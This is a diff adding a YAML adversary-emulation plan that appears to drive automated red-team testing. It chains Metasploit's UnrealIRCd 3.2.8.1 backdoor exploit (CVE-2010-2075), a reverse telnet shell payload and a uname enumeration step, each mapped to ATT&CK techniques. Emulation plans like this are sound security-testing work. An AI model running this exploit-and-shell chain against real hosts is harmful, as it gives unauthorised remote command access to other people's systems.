@@ -1,0 +1,92 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-10 19:29:01 UTC+0000
+attack_action_sequence:
+  - uuid: 03a4b465-a3c7-403a-9004-d454a344dd30
+    name: UnrealIRCD 3.2.8.1 Backdoor Command Execution
+    id:
+      - T1203
+    source: Metasploit Exploit
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+    technique:
+      - Exploitation for Client Execution
+    description: This module exploits a malicious backdoor that was added to the Unreal
+      IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz
+      archive between November 2009 and June 12th 2010.
+    testbed:
+      CVE:
+        - CVE-2010-2075
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("unix/irc/unreal_ircd_3281_backdoor")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 6667
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      ConnectTimeout:
+        CurrentSetting: 10
+        Required: true
+        Description: Maximum number of seconds to establish a TCP connection
+  - uuid: e1737150-7a3a-4625-9b4e-977265d091c5
+    name: Unix Command Shell, Double Reverse TCP (telnet)
+    id:
+      - T1059.004
+      - T1105
+    source: Metasploit Payload
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - 'Command and Scripting Interpreter: Unix Shell (T1059.004)'
+      - Ingress Tool Transfer (T1105)
+    description: Creates an interactive shell through two inbound connections
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("cmd/unix/reverse")
+    arguments:
+      LHOST:
+        CurrentSetting: ''
+        Required: true
+        Description: The listen address (an interface may be specified)
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+  - uuid: 3a53734a-9e26-4f4b-ad15-059e767f5f14
+    name: Current kernel information enumeration
+    id:
+      - T1059.004
+    source: ART
+    supported_platforms:
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'Command and Scripting Interpreter: Unix Shell'
+    description: |
+      An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.
+    execution:
+      executor: Shell Executor
+      command: |
+        uname -srm
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2010-2075
